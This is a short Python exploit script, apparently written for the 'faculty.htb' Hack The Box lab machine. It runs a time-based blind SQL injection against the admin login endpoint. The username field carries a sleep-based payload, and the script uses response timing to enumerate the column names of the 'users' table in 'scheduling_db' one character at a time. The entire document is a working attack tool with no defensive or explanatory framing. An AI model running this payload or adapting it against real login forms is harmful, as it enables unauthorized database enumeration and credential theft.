#!/usr/bin/python3
# >>> string.ascii.lowercase
# >>> string.ascii.upppercase
# >>> string.digits
# >>> string.puncuation
# >>> string.printable
from pwn import *
import requests, time, sys, pdb, string, signal

def def_handler(sig, frame):
    print("\n\n[!] Exiting...\n")
    sys.exit(1)

# CTRL+c
signal.signal(signal.SIGINT, def_handler)

#time.sleep(10)
# Global Variables
characters = string.ascii_lowercase + string.digits + "-_"
login_url = "http://faculty.htb/admin/ajax.php?action=login"

def sqli():
    columns = ""
    p1 = log.progress("SQLi_Brute_Force_Attack")
    p1.status("Initiating the SQL Brute Force Attack")
    time.sleep(2)
    p2 = log.progress("Columns [DB:scheduling_db][Table:users]")
    for db in range(0, 7):
        for position in range(1, 20):
            for character in characters:
                post_data = {
                    'username': "admin' and if(substr((select column_name from information_schema.columns where table_schema='scheduling_db' and table_name='users' limit %d,1),%d,1)='%s',sleep(1.5),1)-- -" % (db,position,character),
                    'password': 'admin'
                }

                p1.status(post_data['username'])
                #print(post_data['username'])
                time_start = time.time()
                r = requests.post(login_url, data=post_data)
                time_end = time.time()

                if time_end - time_start > 1.5:
                    columns += character
                    p2.status(columns)
                    break
        columns += ","




if __name__ == '__main__':
    sqli()